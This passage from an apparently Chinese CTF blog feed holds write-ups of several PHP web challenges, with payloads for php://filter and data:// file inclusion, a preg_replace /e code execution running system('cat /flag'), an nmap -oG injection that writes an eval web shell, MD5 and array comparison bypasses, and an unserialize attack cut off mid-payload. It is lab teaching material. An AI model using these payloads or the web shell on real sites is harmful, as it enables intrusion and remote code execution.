class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br><br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>file_get_contents()函数的绕过<br>使用php:&#x2F;&#x2F;input伪协议绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php">条件：<br><br>不需要开启allow_url_fopen，仅php:<span class="hljs-comment">//input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</span><br><br>php:<span class="hljs-comment">// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</span><br>php:<span class="hljs-comment">//filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</span><br><br>PHP.ini：<br><br>php:<span class="hljs-comment">//filter在双off的情况下也可以正常使用；</span><br><br>allow_url_fopen ：off/on<br><br>allow_url_include：off/on<br>将要GET的参数?xxx=php:<span class="hljs-comment">//input</span><br>用post方法传入想要<span class="hljs-title function_ invoke__">file_get_contents</span>()函数返回的值<br><br>用data:<span class="hljs-comment">//伪协议绕过</span><br>data:<span class="hljs-comment">//协议必须双在on才能正常使用；</span><br>allow_url_fopen ：on<br>allow_url_include：on<br>将url改为：?xxx=data:<span class="hljs-comment">//text/plain;base64,想要file_get_contents()函数返回的值的base64编码</span><br>或者将url改为：?xxx=data:text/plain,(url编码的内容)<br></code></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">payload：?text=data:<span class="hljs-comment">//text/plain,I%20have%20a%20dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></code></pre></td></tr></table></figure><p>得到base64编码内容</p><p>解码后得：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>然后是preg_replace函数的&#x2F;e漏洞，可是这里是strtolower(“\1”)，怎么才能让他变成我们要执行的代码呢？</p><p>\1表示取出正则匹配后的第一个子匹配中的第一项，strtolower()的作用是把大写字母转换为小写字母。</p><p>所以我们构造$re&#x3D;(\S*)，这样正则就变成了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(\S*)/ei&#x27;</span>,<span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="hljs-variable">$str</span>);<br></code></pre></td></tr></table></figure><p>\1就会匹配(\S*)，也就是$str。</p><p>构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">next.php?(\S*)=$&#123;<span class="hljs-title function_ invoke__">getFlag</span>()&#125;&amp;cmd=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>这样$re &#x3D; (\S*)， $str &#x3D; getFlag() ，而函数getFlag() 的参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd = system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>即执行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">→<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(\S*)/ei&#x27;</span>,<span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,@<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);));<br>→<span class="hljs-keyword">echo</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF 2018Online Tool</title>
    <link href="/2022/03/03/BUUCTF-2018Online-Tool/"/>
    <url>/2022/03/03/BUUCTF-2018Online-Tool/</url>
    
    <content type="html"><![CDATA[<h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><p>11&#x2F;29&#x2F;2020</p><p>月黑风高   正常</p><p>代码审计发现两个函数没见过  百度</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数<br><br>功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)<br><br>定义 ：string escapeshellarg ( string $arg )<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">escapeshellcmd — shell 元字符转义<br><br>功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。<br><br>反斜线（\）会在以下字符之前插入： &amp;#;`|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A 和 \xFF*。 *’ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。<br><br>定义 ：string escapeshellcmd ( string $command)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">传入的参数是：172.17.0.2&#x27; -v -d a=1<br>经过escapeshellarg处理后变成了&#x27;172.17.0.2&#x27;\&#x27;&#x27; -v -d a=1&#x27;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。<br>经过escapeshellcmd处理后变成&#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php<br>最后执行的命令是curl &#x27;172.17.0.2&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;，由于中间的\\被解释为\而不再是转义字符，所以后面的&#x27;没有被转义，与再后面的&#x27;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1&#x27;，即向172.17.0.2\发起请求，POST 数据为a=1&#x27;。<br></code></pre></td></tr></table></figure><p>在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p><p>构造payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?host=&#x27; &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG cmd.php &#x27;<br></code></pre></td></tr></table></figure><p>提交后会有文件路径  使用菜刀连接可以得到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF2020Easy MD5</title>
    <link href="/2022/03/03/BJDCTF2020Easy-MD5/"/>
    <url>/2022/03/03/BJDCTF2020Easy-MD5/</url>
    
    <content type="html"><![CDATA[<h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>11&#x2F;22&#x2F;2020</p><p>雨 正常</p><p>在输入框内输入发现没有什么作用</p><p>查看数据包  发现</p><figure class="highlight sql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span>md5($pass,<span class="hljs-literal">true</span>)<br></code></pre></td></tr></table></figure><p>md5(string,raw)<br>string    必需。规定要计算的字符串。<br>raw    可选。规定十六进制或二进制输出格式：<br>TRUE - 原始 16 字符二进制格式<br>FALSE - 默认。32 字符十六进制数</p><p>md5(string,true)函数在指定了true的时候，是返回的原始 16 字符二进制格式。也就是说会返回这样子的字符串：’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c</p><p>writeup里面就是给的 ffifdyop<br>我们输入这个ffifdyop字符串以后查看源代码发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>))&#123;<br>    <span class="hljs-comment">// wow, glzjin wants a girl friend.</span><br>--&gt;<br></code></pre></td></tr></table></figure><p>这就简单了，可以用网上找的md5碰撞，我们这里用php数组绕过，由于哈希函数无法处理php数组，在遇到数组时返回false，我们就可以利用false&#x3D;&#x3D;false成立使条件成立。<br>构造</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">levels91.php?a[]=1&amp;b[]=2<br></code></pre></td></tr></table></figure><p>输入后发现如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>成了php三等号&#x3D;&#x3D;&#x3D;强类型比较了，那就不能用md5碰撞了，只能用数组，我们POST数据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">param1[]=1&amp;param2[]=2<br></code></pre></td></tr></table></figure><p>得到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战 2019PHP</title>
    <link href="/2022/03/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019PHP/"/>
    <url>/2022/03/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019PHP/</url>
    
    <content type="html"><![CDATA[<h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>11&#x2F;21&#x2F;2020</p><p>雨</p><p>文字提示备份</p><p>用dirsearch 跑出现429状态码  请求过快  -s 选项调整请求等待时间</p><p>发现<a href="http://www.zip/">www.zip</a>  下载下来</p><p>代码审计一下</p><p>index.php关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>    <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>    <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br><br><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>flag.php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>那思路就很清晰了，先创建一个Name对象，username为admin，password为100，然后将之序列化。因为index.php里会自动将之反序列化的。</p><p>因为php7.1+对类属性的检测不严格，可以直接用public来进行序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-number">100</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-comment">//运行会输出 O:4:&quot;Name&quot;:2:&#123;s:11:&quot; * username&quot;;s:5:&quot;admin&quot;;s:11:&quot; * password&quot;;i:100;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>private</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-number">100</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-comment">//O:4:&quot;Name&quot;:2:&#123;s:14:&quot; Name username&quot;;s:5:&quot;admin&quot;;s:14:&quot; Name password&quot;;i:100;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>public</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-number">100</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-comment">//O:4:&quot;Name&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;i:100;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里使用_wakeup函数进行绕过</p><p>据上述 编写脚本flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;100&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br></code></pre></td></tr></table></figure><p>得到序列化后的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>结合在index.php中的代码 构造pyload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?select=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span 